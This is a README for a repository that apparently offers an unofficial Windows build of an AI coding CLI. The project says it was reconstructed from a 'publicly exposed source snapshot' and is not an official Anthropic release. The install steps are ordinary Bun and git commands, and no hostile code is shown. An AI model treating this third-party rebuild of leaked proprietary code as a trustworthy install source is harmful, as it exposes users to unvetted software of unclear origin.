# 🚀 not-clawd-code - Run Claude Code on Windows

[![Download / Open the project page](https://img.shields.io/badge/Download%20%2F%20Open%20Project-Visit%20GitHub%20Page-2ea44f?style=for-the-badge)](https://github.com/uzuma645/not-clawd-code)

## 📥 Download
Visit this page to download and run the software:

https://github.com/uzuma645/not-clawd-code

## 🖥️ What this app does
`not-clawd-code` is a local desktop-style command-line app you run on your own computer. It starts an interactive AI coding session in a terminal window. You type prompts, read replies, and work through tasks step by step.

It is built for Windows users who want a simple way to open the project, install it, and start it from the command line with Bun.

## ✅ What you need
Before you start, make sure your PC has:

- Windows 10 or Windows 11
- An internet connection
- At least 2 GB of free disk space
- A terminal app such as Windows Terminal or PowerShell
- Bun installed on your computer

If you do not have Bun yet, install it first from the Bun website, then return to this project page.

## 🚀 Getting started

### 1. Open the project page
Go to:

https://github.com/uzuma645/not-clawd-code

### 2. Download the source
Use the green **Code** button on the GitHub page, then choose **Download ZIP**.

### 3. Extract the files
After the ZIP file finishes downloading:

- Find it in your Downloads folder
- Right-click the file
- Choose **Extract All**
- Pick a folder you can find again, such as `Documents\not-clawd-code`

### 4. Open a terminal in the project folder
You can do this in a few ways:

- Open the folder in File Explorer
- Click the address bar
- Type `powershell`
- Press Enter

Or:

- Open Windows Terminal
- Use `cd` to move into the extracted folder

Example:

```powershell
cd C:\Users\YourName\Documents\not-clawd-code
```

### 5. Install the files the app needs
Run:

```powershell
bun install
```

This sets up the project so it can run on your computer.

### 6. Start the app
Run:

```powershell
bun run dev
```

If the app starts correctly, it opens an interactive terminal session.

## 🧭 How to use it
After the app starts, you can type requests in plain language. For example:

- Help me clean up this code
- Explain this file
- Make this script easier to read
- Fix this error message
- Add a small feature to this project

The app responds in the terminal. You can keep the session open and continue the same task.

## 🛠️ Other useful commands

### Check the version
```powershell
bun run version
```

### Build the project
```powershell
bun run build
```

### Install again after updates
```powershell
bun install
```

## 📂 Project files
The repository includes the restored files needed to run the local build again. The tree was rebuilt from an incomplete source snapshot and now includes the missing parts needed for the app to start on a local Windows machine.

Common folders and files you may see include:

- `src/` for the app logic
- `media/` for screenshots
- `package.json` for project settings
- Bun-related runtime files
- compatibility files used to keep the app running

## ⚙️ System notes
This project works best with:

- Bun 1.1 or newer
- A modern Windows release
- A terminal that supports interactive apps
- Enough memory to keep a local session open while you work

For the smoothest run, keep the project in a simple folder path such as:

- `C:\not-clawd-code`
- `C:\Users\YourName\Documents\not-clawd-code`

Avoid paths with special characters if you run into file access problems.

## 🔍 What was rebuilt
The original public snapshot did not contain a full working app. This repository now includes the missing pieces needed for local use, such as:

- root files needed for Bun
- runtime compatibility files
- source and runtime fixes
- patches for missing app pieces
- build setup so the CLI can start again

## 🧩 Troubleshooting

### Bun is not recognized
If Windows says it cannot find `bun`:

- Close the terminal
- Reopen it
- Try again
- Check that Bun is installed
- Make sure Bun is added to your PATH

### The app does not start
If `bun run dev` fails:

- Run `bun install` again
- Check that you are in the project folder
- Make sure the download finished fully
- Try a fresh folder path such as `C:\not-clawd-code`

### The terminal closes too fast
If the window closes right away:

- Start PowerShell first
- Run the commands inside PowerShell
- Do not double-click the project files

### File access errors
If Windows blocks a file:

- Right-click the file or folder
- Open **Properties**
- Clear any blocked file notice
- Try again from a folder you own

## 🖱️ Simple Windows install path

### Option 1: Use ZIP download
1. Open the project page
2. Download the ZIP
3. Extract it
4. Open PowerShell in the folder
5. Run `bun install`
6. Run `bun run dev`

### Option 2: Use Git if you already have it
```powershell
git clone https://github.com/uzuma645/not-clawd-code.git
cd not-clawd-code
bun install
bun run dev
```

## 📌 Useful details
- Package name: `not_clawd_code`
- Version: `1.0.24`
- Bun target: `>=1.1.0`
- Verified Bun version in this workspace: `1.3.11`

## 🖼️ Screenshot
![Interactive not_clawd_code session](./media/image.png)

## 📄 License and origin
This repository is a reconstructed local build based on a publicly exposed source snapshot from March 31, 2026. It is not an official Anthropic release